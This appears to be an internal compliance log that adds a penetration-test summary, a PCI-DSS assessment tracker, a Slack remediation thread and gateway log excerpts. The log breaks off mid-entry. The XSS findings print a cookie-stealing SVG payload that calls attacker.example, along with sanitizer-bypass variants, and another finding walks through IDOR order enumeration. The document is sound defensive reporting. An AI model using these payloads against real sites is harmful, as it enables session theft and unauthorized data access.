@@ -1,0 +1,1188 @@
+================================================================================
+VANTAGE COMMERCE — COMPLIANCE & SECURITY TESTING LOG
+Date: 2025-09-10
+Classification: CONFIDENTIAL
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+DOCUMENT 1: Q3 2025 Scheduled External Penetration Test — Executive Summary
+────────────────────────────────────────────────────────────────────────────────
+
+Title: Q3 2025 Scheduled External Penetration Test — Executive Summary
+Vendor: Ironclad Security Partners
+Lead Tester: Dara Okonkwo
+Engagement ID: ISP-VC-2025-Q3-0042
+Scope: checkout-service, payment-gateway, order-management-service (external-facing)
+Environment: staging-pentest (isolated cluster)
+Test Window: 2025-09-01 through 2025-09-08
+Classification: CONFIDENTIAL
+
+--- Scope Details ---
+
+Services tested:
+  1. checkout-service v2.18.3
+     Repository: git.vantage-internal.com/platform/checkout-service
+     Deployed image: vcr.io/checkout-service:v2.18.3-staging-pentest
+     Replicas in staging-pentest: 3
+     Last production deploy: 2025-08-27
+
+  2. payment-gateway v4.7.1
+     Repository: git.vantage-internal.com/platform/payment-gateway
+     Deployed image: vcr.io/payment-gateway:v4.7.1-staging-pentest
+     Replicas in staging-pentest: 2
+     Last production deploy: 2025-08-30
+
+  3. order-management-service v3.12.0
+     Repository: git.vantage-internal.com/platform/order-management-service
+     Deployed image: vcr.io/order-management-service:v3.12.0-staging-pentest
+     Replicas in staging-pentest: 2
+     Last production deploy: 2025-08-25
+
+Environment: staging-pentest (isolated cluster)
+  Network segments in scope:
+    - 10.42.16.0/24 (staging-ext) — external-facing service mesh
+    - 10.42.17.0/24 (staging-payments) — payment processing subnet
+  Isolation: No connectivity to production environment. Separate VPC peering disabled.
+  DNS resolution: internal-only via staging-dns-01 (10.42.16.2)
+  Ingress controller: nginx-ingress v1.9.4 on staging-pentest-ingress-01
+  Load balancer: AWS NLB staging-pentest-nlb (internal)
+
+Test credential set: pentest-svc-account-q3
+  Provisioned: 2025-08-30
+  Permissions: read/write access to checkout, payment, and order APIs
+  Rotated post-engagement: 2025-09-09
+  Confirmed revoked: 2025-09-09 09:14 UTC by Marcus Tran
+  Verification: attempted authentication at 09:16 UTC returned HTTP 401
+
+WAF rule set: vc-waf-prod-2025q2
+  Total rules in set: 247
+  Last updated: 2025-07-15
+  WAF blocked 94% of automated scan payloads during the test window.
+  6% of payloads reached application layer and were handled by input validation.
+  WAF mode: blocking (not logging-only)
+  False positive rate during test: 0.02% (4 legitimate test requests incorrectly blocked, allowlisted mid-test)
+
+Security lead acknowledgment: Marcus Tran (Vantage Commerce security lead)
+  Acknowledged receipt of preliminary findings on 2025-09-09 at 16:00 UTC.
+  Scheduled remediation sprint for week of 2025-09-15.
+  Confirmed all findings distributed to relevant service owners.
+
+--- Assessment Methodology ---
+
+Ironclad Security Partners performed OWASP Top 10 assessment against three external-facing services over 7-day window.
+
+Attack vectors tested: 18 unique vectors including:
+  - SQL injection (classic, blind, time-based, second-order, stacked queries)
+  - Cross-Site Scripting (stored, reflected, DOM-based, mutation-based)
+  - Cross-Site Request Forgery (token bypass, SameSite cookie evasion, JSON content-type abuse)
+  - Server-Side Request Forgery (internal URL schema, DNS rebinding, redirect chains, cloud metadata)
+  - Authentication bypass (JWT manipulation, session fixation, credential stuffing, token replay)
+  - Insecure Direct Object References (sequential ID, UUID prediction, path traversal)
+  - XML External Entity injection (DTD parsing, out-of-band extraction, parameter entities)
+  - Security misconfiguration (default credentials, verbose error messages, directory listing)
+  - Broken access control (privilege escalation, forced browsing, method tampering)
+  - Cryptographic failures (weak cipher suites, certificate pinning bypass, key leakage)
+  - Insecure deserialization (Java/JSON deserialization gadgets, prototype pollution)
+  - Insufficient logging and monitoring (log injection, timestamp manipulation)
+
+Total requests generated during test: 847,293
+  Breakdown by service:
+    checkout-service: 312,847 requests
+    payment-gateway: 241,092 requests
+    order-management-service: 293,354 requests
+
+Unique endpoints tested: 142
+  checkout-service: 47 endpoints
+  payment-gateway: 38 endpoints
+  order-management-service: 57 endpoints
+
+All findings mapped to CWE identifiers per Ironclad methodology v3.2.
+CVSS scores calculated using CVSS v3.1 calculator.
+
+Duration breakdown:
+  Phase 1 — Automated scanning: 2 days (Sep 1-2)
+    Tools: Burp Suite Professional v2025.8, Nuclei v3.2.1, SQLMap v1.7.9
+    Custom scripts: ISP-SCRIPTS v3.2 (proprietary Ironclad probe library)
+  Phase 2 — Manual testing: 3 days (Sep 3-5)
+    Lead: Dara Okonkwo
+    Support: 2 additional Ironclad testers (Mikael Strand, Priya Narayan)
+  Phase 3 — Verification and report: 2 days (Sep 6-8)
+    All findings verified with manual reproduction
+    False positive elimination pass conducted
+
+Test infrastructure:
+  3 attack VMs in staging-pentest network:
+    ironclad-scan-01 (10.42.16.51) — automated scanning
+    ironclad-scan-02 (10.42.16.52) — manual testing
+    ironclad-scan-03 (10.42.16.53) — traffic analysis and replay
+  Traffic capture: tcpdump on staging-pentest gateway, full PCAP retained
+  PCAP archive reference: ISP-VC-2025-Q3-0042-pcap (47.2 GB)
+
+--- Findings Summary ---
+
+  Critical:       0
+  High:           0
+  Medium:         1
+  Low:            2
+  Informational:  4
+  Total:          7
+
+Previous quarter (Q2 2025) had:
+  Critical: 0, High: 1, Medium: 2, Low: 3 — net improvement this quarter.
+
+Quarter-over-quarter comparison:
+  Q1 2025: 0C, 0H, 1M, 2L — 3 total findings
+  Q2 2025: 0C, 1H, 2M, 3L — 6 total findings
+  Q3 2025: 0C, 0H, 1M, 2L — 3 total findings (current)
+
+--- Finding VC-PT-037 (MEDIUM) ---
+
+Service: order-management-service v3.12.0
+Endpoint: /api/v2/orders/{id}/status
+Method: GET
+Authentication: Bearer token (valid authenticated user)
+
+Description:
+The /api/v2/orders/{id}/status endpoint permits sequential ID enumeration. An authenticated user can increment the order ID parameter to retrieve order status for other customers. Severity: MEDIUM. CVSS 5.3.
+
+CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
+CWE: CWE-639 (Authorization Bypass Through User-Controlled Key)
+
+Reproduction steps:
+  1. Authenticate as test-user-alpha via /api/v2/auth/login
+  2. Retrieve own order: GET /api/v2/orders/100452/status — returns HTTP 200 with order details
+  3. Modify order ID to 100453 (belonging to test-user-beta)
+  4. GET /api/v2/orders/100453/status — returns HTTP 200 with full order status payload
+  5. Tested with 50 sequential IDs (100450-100500) — all returned HTTP 200 with order details
+  6. No rate limiting applied to order status endpoint
+  7. Response includes customer_id, order total, shipping address city, carrier, tracking number
+
+HTTP Request (step 3):
+  GET /api/v2/orders/100453/status HTTP/1.1
+  Host: checkout.staging-pentest.vc-internal.net
+  Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYWxwaGEtdGVzdC0wMDEiLCJzY29wZSI6Im9yZGVyczpyZWFkIiwiaWF0IjoxNjk0MzQ1NjAwfQ.Rk9PQkFS...
+  Accept: application/json
+  X-Request-ID: pt-req-2025-09-04-00781
+  User-Agent: IronScan/3.2
+
+HTTP Response:
+  HTTP/1.1 200 OK
+  Content-Type: application/json; charset=utf-8
+  X-Request-ID: pt-req-2025-09-04-00781
+  X-Correlation-ID: corr-8a4f2c3b-7e91-4d5a
+  X-Response-Time: 14ms
+  Cache-Control: no-store
+  Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+  {
+    "order_id": 100453,
+    "status": "shipped",
+    "customer_id": "cust-beta-002",
+    "items_count": 3,
+    "order_total": "$147.82",
+    "currency": "USD",
+    "shipping_address_city": "Portland",
+    "shipping_carrier": "UPS",
+    "tracking_number": "1Z999AA10123456784",
+    "estimated_delivery": "2025-09-07",
+    "last_updated": "2025-09-03T14:22:00Z"
+  }
+
+Recommendation: Implement UUID-based order identifiers or add ownership validation middleware to order status lookup. Estimated remediation: 2 story points.
+
+Alternative recommendation: Add authorization middleware that checks requesting user's customer_id against order's customer_id. Return HTTP 403 for non-matching requests.
+
+--- Finding VC-PT-041 (LOW) ---
+
+Service: checkout-service v2.18.3
+Endpoint: /checkout/confirmation (rendered HTML page)
+Vector: Stored XSS via coupon code input field
+
+Description:
+Stored XSS possible via coupon code display in checkout confirmation page. Input sanitization strips <script> tags but permits event handlers in SVG elements. Severity: LOW. CVSS 3.1.
+
+CVSS Vector: AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N
+CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation)
+
+Reproduction steps:
+  1. Authenticate as test-user-alpha
+  2. Submit coupon code containing SVG payload: <svg onload=fetch('https://attacker.example/collect?c='+document.cookie)>
+  3. Coupon code is rejected as invalid but the displayed_code field renders unsanitized
+  4. Navigate to checkout confirmation page
+  5. SVG element renders in confirmation page HTML and fires onload handler
+  6. Cookie value sent to external endpoint (in test, intercepted by Ironclad proxy)
+
+HTTP Request (coupon submission):
+  POST /api/v2/checkout/apply-coupon HTTP/1.1
+  Host: checkout.staging-pentest.vc-internal.net
+  Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyX2lkIjoiYWxwaGEtdGVzdC0wMDEiLCJzY29wZSI6ImNoZWNrb3V0OndyaXRlIn0.Rk9PQkFS...
+  Content-Type: application/json
+  X-Request-ID: pt-req-2025-09-05-01203
+  User-Agent: IronScan/3.2
+
+  {
+    "coupon_code": "<svg onload=fetch('https://attacker.example/collect?c='+document.cookie)>",
+    "cart_id": "cart-alpha-test-007"
+  }
+
+HTTP Response:
+  HTTP/1.1 200 OK
+  Content-Type: application/json; charset=utf-8
+  X-Request-ID: pt-req-2025-09-05-01203
+
+  {
+    "applied": false,
+    "message": "Invalid coupon code",
+    "displayed_code": "<svg onload=fetch('https://attacker.example/collect?c='+document.cookie)>"
+  }
+
+HTTP Request (confirmation page rendering):
+  GET /checkout/confirmation?order=100460 HTTP/1.1
+  Host: checkout.staging-pentest.vc-internal.net
+  Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...
+  Accept: text/html
+  X-Request-ID: pt-req-2025-09-05-01210
+
+HTTP Response (partial body):
+  HTTP/1.1 200 OK
+  Content-Type: text/html; charset=utf-8
+
+  <!-- coupon attempt display section -->
+  <div class="coupon-status">
+    <span class="label">Attempted coupon:</span>
+    <span class="value"><svg onload=fetch('https://attacker.example/collect?c='+document.cookie)></span>
+  </div>
+
+Sanitizer behavior analysis:
+  Input: <script>alert(1)</script> → sanitized to: alert(1) (script tags stripped) ✓
+  Input: <img src=x onerror=alert(1)> → sanitized to: <img src=x> (event handlers stripped from img) ✓
+  Input: <svg onload=alert(1)> → NOT sanitized (SVG elements pass through) ✗
+  Input: <svg/onload=alert(1)> → NOT sanitized (SVG with slash variant) ✗
+  Input: <math><mtext><table><mglyph><svg><mtext><textarea><path onload=alert(1)> → NOT sanitized (nested SVG) ✗
+
+Mitigation factors:
+  - Requires authenticated user to submit coupon
+  - XSS fires only on the submitting user's own confirmation page (self-XSS scenario)
+  - HttpOnly flag on session cookie limits exfiltration of session token
+  - SameSite=Strict on session cookie prevents cross-origin replay
+  - CSP header does not include connect-src restriction (fetch to external domain succeeds)
+
+Recommendation: Sanitize SVG elements and event handler attributes in coupon code display. Use DOMPurify or equivalent library. Alternatively, HTML-encode all user-supplied values before rendering.
+
+--- Finding VC-PT-042 (LOW) ---
+
+Service: checkout-service v2.18.3
+Endpoint: /checkout/confirmation (rendered HTML page, order summary sidebar)
+Vector: Stored XSS via secondary coupon display field
+
+Description:
+Similar to VC-PT-041. The order summary sidebar widget also renders the unsanitized coupon code in a different location on the same page. The same SVG vector applies.
+
+Severity: LOW
+CVSS: 3.1
+CWE: CWE-79
+
+HTTP Response (sidebar section):
+  <!-- order summary sidebar snippet -->
+  <div class="order-summary-sidebar">
+    <h3>Order Summary</h3>
+    <div class="line-item">Subtotal: $89.99</div>
+    <div class="line-item">Shipping: $9.99</div>
+    <div class="coupon-applied">
+      Coupon: <svg onload=fetch('https://attacker.example/collect')>
+    </div>
+    <div class="line-item total">Total: $99.98</div>
+  </div>
+
+Recommendation: Same as VC-PT-041. Consolidated fix applies to both display locations. Single remediation ticket covers both findings.
+
+--- Informational Findings ---
+
+VC-PT-043 (INFO): Server Version Disclosure
+  Service: checkout-service v2.18.3
+  Header: X-Powered-By: Express 4.18.2
+  Risk: Allows attacker to identify framework and version for targeted exploit research
+  Recommendation: Remove or obfuscate X-Powered-By header in production
+  HTTP Sample:
+    Response headers from GET /api/v2/checkout/health:
+      HTTP/1.1 200 OK
+      X-Powered-By: Express 4.18.2
+      Content-Type: application/json
+
+VC-PT-044 (INFO): CORS Configuration
+  Service: payment-gateway v4.7.1
+  CORS Access-Control-Allow-Origin: *.vantage.com
+  CORS Access-Control-Allow-Credentials: true
+  Risk: Any subdomain of vantage.com can make credentialed requests to payment-gateway
+  Note: Acceptable per business requirements — document in risk register
+  HTTP Sample:
+    OPTIONS /api/v2/payments HTTP/1.1
+    Origin: https://staging.vantage.com
+    Access-Control-Request-Method: POST
+    →
+    HTTP/1.1 204 No Content
+    Access-Control-Allow-Origin: https://staging.vantage.com
+    Access-Control-Allow-Credentials: true
+    Access-Control-Allow-Methods: GET, POST, OPTIONS
+
+VC-PT-045 (INFO): Verbose Error Messages in Staging
+  Service: order-management-service v3.12.0
+  Behavior: Returns full stack traces in error responses in staging environment
+  Note: Expected behavior; production config has ENABLE_STACK_TRACE=false
+  HTTP Sample:
+    GET /api/v2/orders/INVALID/status HTTP/1.1
+    →
+    HTTP/1.1 400 Bad Request
+    {
+      "error": "Invalid order ID format",
+      "stack": "ValidationError: order_id must be integer\n    at OrderController.getStatus (/app/src/controllers/order.js:47:11)\n    at Layer.handle..."
+    }
+
+VC-PT-046 (INFO): TLS Version in Staging
+  Service: All services in staging-pentest
+  Observation: TLS 1.2 and 1.3 both supported in staging-pentest
+  Note: Production enforces TLS 1.3 only per CDE policy (TLS 1.2 deprecated 2025-07-01)
+  Verification: openssl s_client -tls1_2 -connect checkout.staging-pentest.vc-internal.net:443 → handshake succeeded
+  Verification: openssl s_client -tls1_2 -connect checkout.prod.vc-internal.net:443 → handshake failed (expected, TLS 1.2 disabled in production)
+
+────────────────────────────────────────────────────────────────────────────────
+DOCUMENT 2: PCI-DSS v4.0 Self-Assessment Questionnaire — SAQ-D Progress Tracker
+────────────────────────────────────────────────────────────────────────────────
+
+Title: PCI-DSS v4.0 Self-Assessment Questionnaire — SAQ-D Progress Tracker
+Assessor: Lena Vasquez (Internal Audit)
+Period: 2025 Annual Assessment
+Target Completion: 2025-10-31
+QSA Firm: Thornton-Kiley Associates
+QSA Lead Auditor: James Reiter
+
+--- Progress Summary ---
+
+SAQ-D Progress: 189/251 controls assessed.
+  PASS:           176
+  PARTIAL:        8
+  NOT ASSESSED:   5
+  REMAINING:      62 controls scheduled for weeks 3-4 of September
+
+Assessment started: 2025-07-15
+Current pace: approximately 25 controls per week
+Projected completion at current pace: 2025-10-08 (ahead of 2025-10-31 deadline)
+
+Evidence storage: audit vault (S3 bucket vc-audit-evidence-2025, AES-256 encrypted)
+Evidence naming convention: AV-2025-PCI-{category}-{seq}
+
+--- Requirement 1: Install and Maintain Network Security Controls ---
+
+Status: PASS (all sub-controls assessed)
+
+Req 1.1 — Network security controls defined and documented:
+  Network diagram: current as of 2025-08-20
+  Diagram tool: Lucidchart, version-controlled in git.vantage-internal.com/infra/network-diagrams
+  Last review: 2025-08-20 by Marcus Tran
+  Evidence: AV-2025-PCI-NET-001
+
+Req 1.2 — Firewall rules restrict CDE ingress/egress:
+  Firewall: Palo Alto PA-5260 (fw-core-01)
+  Total rules: 847
+  CDE-specific rules: 124
+  Last rule review: 2025-08-15
+  Review frequency: quarterly
+  Evidence: AV-2025-PCI-FW-001
+
+Req 1.3 — Network access to CDE restricted:
+  CDE segment: 10.42.20.0/22
+  Allowed ingress sources: payment-gateway subnet, admin console (443/tcp only)
+  Egress: proxy-prod-01 allowlist only (no direct internet)
+  Evidence: AV-2025-PCI-NET-002
+
+--- Requirement 2: Apply Secure Configurations ---
+
+Status: PASS
+
+Req 2.1 — No default vendor credentials:
+  Scan performed: 2025-08-12
+  Scope: all 23 CDE hosts
+  Default credentials found: 0
+  Tool: custom credential scanner + CIS benchmark checker
+  Evidence: AV-2025-PCI-CFG-001
+
+Req 2.2 — System configuration standards applied:
+  Hardening benchmark: CIS Level 2 for Ubuntu 22.04
+  Compliance rate: 100% of CDE hosts
+  Last configuration audit: 2025-08-10
+  Evidence: AV-2025-PCI-CFG-002
+
+--- Requirement 3: Protect Stored Account Data ---
+
+Status: PASS
+
+Req 3.4 — Render PAN unreadable:
+  Confirmed tokenization-service v2.4.0 replaces full PAN with token before storage.
+  Evidence screenshot captured from database query showing token-only records.
+  Token format: vc_tok_{uuid_v4}
+  Tokenization-service processes 2.3M transactions/day.
+  Sample of 500 database records inspected — zero instances of unmasked PAN in storage.
+
+  Database query evidence (sanitized):
+    SELECT payment_token, last_four, card_brand FROM transactions
+    WHERE created_at BETWEEN '2025-09-01' AND '2025-09-08'
+    ORDER BY created_at DESC LIMIT 500;
+
+    Results: 500 rows. All payment_token values match pattern vc_tok_[a-f0-9-]{36}.
+    No column contains full PAN. last_four column contains exactly 4 digits.
+    Evidence: AV-2025-PCI-TOK-001
+
+Req 3.5 — Primary Account Number secured wherever stored:
+  Storage locations audited:
+    - transactions table (payment-db-primary): tokenized ✓
+    - audit_log table (siem-db): no PAN present ✓
+    - backup-payment-daily S3 bucket: encrypted at rest with vault-kms-prod key ✓
+    - Kafka topic payment-events: PAN redacted before publish ✓
+  Evidence: AV-2025-PCI-TOK-002
+
+--- Requirement 4: Strong Cryptography During Transmission ---
+
+Status: PASS
+
+Encryption in transit: TLS 1.3 enforced on all CDE ingress
+TLS 1.2 deprecated as of 2025-07-01
+Certificate pinning: active on mobile clients (iOS v4.2+, Android v3.8+)
+
+TLS configuration (CDE ingress):
+  ssl_protocols: TLSv1.3
+  ssl_ciphers: TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
+  ssl_prefer_server_ciphers: on
+  ssl_session_timeout: 1h
+  ssl_session_cache: shared:SSL:10m
+  HSTS: max-age=31536000; includeSubDomains; preload
+
+Evidence: AV-2025-PCI-TLS-001
+
+--- Requirement 6.5: Secure Development ---
+
+Cross-referenced with pentest report ISP-VC-2025-Q3-0042:
+  6.5.1 (Injection): No SQL injection findings → PASS
+  6.5.4 (IDOR): 1 medium finding (VC-PT-037) → PARTIAL — remediation scheduled sprint 38
+  6.5.7 (XSS): 2 low findings (VC-PT-041, VC-PT-042) → PARTIAL — remediation scheduled sprint 38
+  6.5.2 (Buffer overflow): N/A (Node.js/Python services)
+  6.5.3 (Insecure cryptographic storage): No findings → PASS
+  6.5.5 (Improper error handling): 1 informational in staging only → PASS (production not affected)
+
+--- Requirement 8.3: MFA for CDE Access ---
+
+MFA enforcement logs collected for 47 users with CDE access — 100% coverage confirmed.
+All 47 users have hardware FIDO2 keys enrolled.
+Last enrollment date: 2025-08-22 (new hire R. Pham).
+
+Req 8.3 MFA Audit detail:
+  Total users with CDE network access: 47
+  FIDO2 hardware keys enrolled: 47/47 (100%)
+  Backup authentication method: None (FIDO2 only per policy VC-SEC-POL-008)
+  Last enrollment event: R. Pham, enrolled 2025-08-22
+  MFA challenge failure rate (September 1-10): 0.3% (hardware key not present at desk, resolved by user retry)
+  MFA bypass attempts detected: 0
+  Evidence: AV-2025-PCI-MFA-001
+
+--- Requirement 10.2: Audit Trail ---
+
+Audit log retention verified: 13 months (exceeds 12-month minimum).
+Log storage: centralized SIEM (Splunk), backed by S3 cold storage after 90 days.
+Log integrity: SHA-256 hash chain on hourly log segments.
+Log sources: 23 CDE hosts + 4 network devices + 2 security appliances = 29 sources.
+
+Log volume (September 1-10):
+  Total events: 14.7M
+  Average daily: 1.47M events
+  Storage consumed: 23.4 GB (compressed)
+  Oldest available log: 2024-07-28 (14 months ago)
+
+Evidence: AV-2025-PCI-LOG-001
+
+--- Requirement 11.3: Penetration Testing ---
+
+Evidence artifact attached: Ironclad pentest executive summary
+  Reference: ISP-VC-2025-Q3-0042
+  Classification: CONFIDENTIAL
+  Stored in audit vault: AV-2025-PCI-PT-Q3
+
+Previous penetration tests:
+  Q1 2025: ISP-VC-2025-Q1-0040 — 0C, 0H, 1M, 2L
+  Q2 2025: ISP-VC-2025-Q2-0041 — 0C, 1H, 2M, 3L
+  Q3 2025: ISP-VC-2025-Q3-0042 — 0C, 0H, 1M, 2L (current)
+
+--- CDE Boundary Validation ---
+
+CDE boundary validated via quarterly ASV scan:
+  Scanner: Qualys
+  Scan ID: QV-2025-0903
+  Scan Date: 2025-09-03
+  Result: PASSED
+  Findings: 0 Critical, 0 High, 2 Medium (patched prior to scan rescan), 5 Low (accepted risk with documentation)
+
+Network segmentation test last performed: 2025-06-15
+Next segmentation test due: 2025-12-15
+Cardholder data environment (CDE) segment: 10.42.20.0/22
+  Hosts in scope: 23 servers
+  Services in scope: payment-gateway, tokenization-service, vault-kms-prod
+
+--- Encryption at Rest ---
+
+Algorithm: AES-256-GCM via vault-kms-prod (HashiCorp Vault cluster)
+Key rotation: every 90 days
+Last rotation: 2025-08-28
+Next rotation due: 2025-11-26
+
+Key management details:
+  Master key: Shamir's Secret Sharing, 5-of-8 threshold
+  Key custodians: 8 designated personnel (6 security team + 2 executives)
+  Key ceremony log: last ceremony 2025-08-28 03:00 UTC
+  Custodians present: 5 of 8 (quorum met)
+  Old key version: retained for decryption, 365-day retention policy
+  Key types:
+    - cde-data-encryption-key (AES-256-GCM, 90-day rotation)
+    - tokenization-master-key (AES-256-GCM, 90-day rotation)
+    - audit-log-signing-key (ECDSA P-256, 180-day manual rotation)
+
+--- Compensating Controls ---
+
+Compensating control CC-2025-01:
+  Legacy batch processor cannot enforce MFA.
+  System: batch-payment-reconciler v1.2 (legacy Java application, scheduled for retirement Q2 2026)
+  Mitigation:
+    - Restricted to read-only CDE access via jump host with session recording
+    - Jump host: jump-host-cde-legacy (10.42.20.250)
+    - Session recording: Teleport v13.1, all sessions recorded and retained 365 days
+    - Access limited to 2 authorized operators: ops-batch-user-01, ops-batch-user-02
+    - Monthly access review by Marcus Tran
+    - Network ACL: jump-host-cde-legacy can only reach batch-payment-reconciler on port 5432 (PostgreSQL read-only)
+  Compensating control worksheet filed with QSA.
+  Next review: December 2025
+
+────────────────────────────────────────────────────────────────────────────────
+DOCUMENT 3: Slack Thread — #compliance-ops — 2025-09-10
+────────────────────────────────────────────────────────────────────────────────
+
+Channel: #compliance-ops
+Date: 2025-09-10
+Thread span: 09:12 to 11:47 UTC (14 messages)
+
+Participants:
+  - lvasquez (Lena Vasquez, Internal Audit Manager)
+  - mtran (Marcus Tran, Security Lead)
+  - jreiter-ext (James Reiter, QSA Lead, Thornton-Kiley Associates — external guest)
+  - apatel (Anika Patel, Engineering — Tokenization Team)
+
+Access notes:
+  jreiter-ext: External vendor Slack access, single-channel guest.
+  Channels: #compliance-ops, #security-compliance
+  Access expires: 2025-10-31 per vendor access policy VC-VENDOR-POL-003
+  Last access review: 2025-09-01
+
+--- Thread ---
+
+[09:12 UTC] lvasquez:
+Pentest came back clean-ish. One medium on order status IDOR, two lows on checkout XSS. Marcus can you confirm the IDOR fix is in the sprint?
+
+[09:14 UTC] lvasquez:
+Full report is in the audit vault under ISP-VC-2025-Q3-0042. I've linked it to the PCI evidence tracker for Requirement 11.3. Also mapped the IDOR finding to Req 6.5.4 and the XSS findings to Req 6.5.7 — both marked as PARTIAL pending remediation.
+
+[09:18 UTC] mtran:
+Yep, JIRA VC-SEC-1247. Sprint 38 starts Monday. Should be done by 9/19 with QA.
+
+[09:20 UTC] mtran:
+For context — the IDOR is just a missing ownership check on the order status endpoint. The order-management team has the fix ready, they just need the sprint slot. Two-line change plus tests.
+
+[09:23 UTC] mtran:
+For the two XSS lows, I'm rolling those into the same sprint. VC-SEC-1248 for the SVG sanitization fix. The sanitizer strips <script> tags but doesn't handle SVG event handlers. We'll add DOMPurify to the rendering pipeline. Probably a half-day of work including tests.
+
+[09:26 UTC] lvasquez:
+Good. I need both closed before the QSA onsite in October so we can move those PCI controls from PARTIAL to PASS. Can you flag me when they're in QA?
+
+[09:28 UTC] mtran:
+Will do. I'll add you as a watcher on both JIRA tickets.
+
+[09:31 UTC] jreiter-ext:
+Quick ask — for CC-2025-01, can you send me the session recording retention policy? Need to attach it to the compensating control worksheet.
+
+[09:34 UTC] lvasquez:
+@jreiter-ext Sure, pulling it now. It's VC-SEC-POL-017-session-recording.pdf in the policy repo. Give me 10 minutes to export and upload.
+
+[09:37 UTC] jreiter-ext:
+Thanks. Also, can you confirm the compensating control review frequency? We need to document whether it's annual or semi-annual in the worksheet.
+
+[09:39 UTC] lvasquez:
+Semi-annual per our internal policy. Last review was June 2025, next review December 2025. The worksheet has the exact dates — I'll make sure the review cadence is explicit in the documentation package.
+
+[09:45 UTC] apatel:
+Tokenization audit logs are flowing again. We had a gap Aug 12-14 when the Kafka connector restarted but backfill completed Aug 15. All records accounted for.
+
+[09:48 UTC] apatel:
+Details: the Kafka Connect cluster had an OOM on the tokenization-audit-sink connector on Aug 12 at 03:17 UTC. Auto-restart didn't trigger because the connector was in a FAILED state, not a restart loop. We manually restarted Aug 14 at 11:00 UTC and ran a backfill job from the Kafka topic (7-day retention) to fill the 47,231 missing audit records. Reconciliation checksum passed. All records accounted for in Splunk.
+
+[09:52 UTC] lvasquez:
+Good — I'll reference that in the Req 10.2 evidence. The gap technically falls within the audit period so we should have it documented. Can you put the reconciliation report in Confluence and send me the link? I'll attach it to the evidence tracker.
+
+[09:55 UTC] apatel:
+Done — Confluence link: Engineering/Tokenization/AuditLogBackfill-Aug2025. Includes the backfill script, the reconciliation SQL query, and the checksum results. Also added a runbook entry for the Kafka connector recovery procedure so this doesn't catch us off guard again.
+
+[10:14 UTC] mtran:
+@lvasquez one more thing — the WAF rule set needs a Q3 review. I'm scheduling that for next week with the security engineering team. Should be quick, mostly checking the new rules we added for API abuse patterns in August. I'll have the updated rule audit report for you by Sept 20.
+
+[10:32 UTC] jreiter-ext:
+Scheduling note — onsite validation confirmed for Oct 13-15. Three of us coming: myself, Sarah Kim, and one junior associate for evidence sampling. We'll need a conference room with screen sharing capability and whiteboard. Can you reserve?
+
+[10:45 UTC] lvasquez:
+@jreiter-ext On it. Conference Room B is reserved for all three days, 9 AM to 5 PM. I'll send calendar invites to the full audit team: you, Sarah, Nathan Osei, myself, Marcus, Carla Mendes. Anything else you need pre-arrival?
+
+[10:52 UTC] jreiter-ext:
+We'll send a document request list by Sept 20. Mostly standard stuff — we'll flag anything new based on the PCI-DSS v4.0 requirements that kicked in this cycle.
+
+[11:47 UTC] lvasquez:
+Sounds good. Talk to you then.
+
+--- Thread Metadata ---
+
+Total messages in thread: 14
+JIRA tickets referenced:
+  - VC-SEC-1247 (IDOR remediation, order-management-service)
+  - VC-SEC-1248 (XSS SVG sanitization, checkout-service)
+Kafka connector restart event: Aug 12-14
+  Root cause: OOM on tokenization-audit-sink connector
+  Records backfilled: 47,231
+  Backfill completed: Aug 15
+  Reconciliation: passed
+QSA onsite dates: 2025-10-13 through 2025-10-15
+Conference room reserved: Conference Room B
+WAF rule review: scheduled for week of 2025-09-15
+
+────────────────────────────────────────────────────────────────────────────────
+APPENDIX A: HTTP Log Excerpts — Pentest Traffic Samples from staging-pentest Gateway
+────────────────────────────────────────────────────────────────────────────────
+
+Source: staging-pentest-gateway access log
+Format: timestamp, method, path, source IP, status, latency, bytes, request ID
+
+[2025-09-03 08:41:22.104 UTC] REQUEST
+  Method: GET
+  Path: /api/v2/orders/100450/status
+  Host: checkout.staging-pentest.vc-internal.net
+  Source IP: 10.42.16.51 (ironclad-scan-01)
+  Authorization: Bearer <redacted-jwt>
+  X-Request-ID: pt-req-2025-09-03-00012
+  User-Agent: IronScan/3.2
+  Accept: application/json
+
+[2025-09-03 08:41:22.118 UTC] RESPONSE
+  Status: 200 OK
+  Content-Type: application/json
+  Content-Length: 342
+  X-Response-Time: 14ms
+  X-Request-ID: pt-req-2025-09-03-00012
+
+[2025-09-03 08:41:23.201 UTC] REQUEST
+  Method: GET
+  Path: /api/v2/orders/100451/status
+  Host: checkout.staging-pentest.vc-internal.net
+  Source IP: 10.42.16.51 (ironclad-scan-01)
+  Authorization: Bearer <redacted-jwt>
+  X-Request-ID: pt-req-2025-09-03-00013
+
+[2025-09-03 08:41:23.213 UTC] RESPONSE
+  Status: 200 OK
+  Content-Length: 351
+  X-Response-Time: 12ms
+
+[2025-09-03 08:41:24.307 UTC] REQUEST
+  Method: GET
+  Path: /api/v2/orders/100452/status
+  Host: checkout.staging-pentest.vc-internal.net
+  Source IP: 10.42.16.51 (ironclad-scan-01)
+  Authorization: Bearer <redacted-jwt>
+  X-Request-ID: pt-req-2025-09-03-00014
+
+[2025-09-03 08:41:24.318 UTC] RESPONSE
+  Status: 200 OK
+  Content-Length: 339
+  X-Response-Time: 11ms
+
+[2025-09-03 08:41:25.412 UTC] REQUEST
+  Method: GET
+  Path: /api/v2/orders/100453/status
+  Host: checkout.staging-pentest.vc-internal.net
+  Source IP: 10.42.16.51 (ironclad-scan-01)
+  Authorization: Bearer <redacted-jwt>
+  X-Request-ID: pt-req-2025-09-03-00015
+
+[2025-09-03 08:41:25.426 UTC] RESPONSE
+  Status: 200 OK
+  Content-Length: 347
+  X-Response-Time: 14ms
+  Note: Sequential ID enumeration — all 4 requests return 200 for different customer orders
+
+--- WAF Block Samples ---
+
+[2025-09-04 14:02:17.501 UTC] WAF EVENT
+  Decision: BLOCK
+  Rule ID: vc-waf-sql-001
+  Rule Name: SQL Injection Pattern — Classic
+  Source IP: 10.42.16.52 (ironclad-scan-02)
+  Method: GET
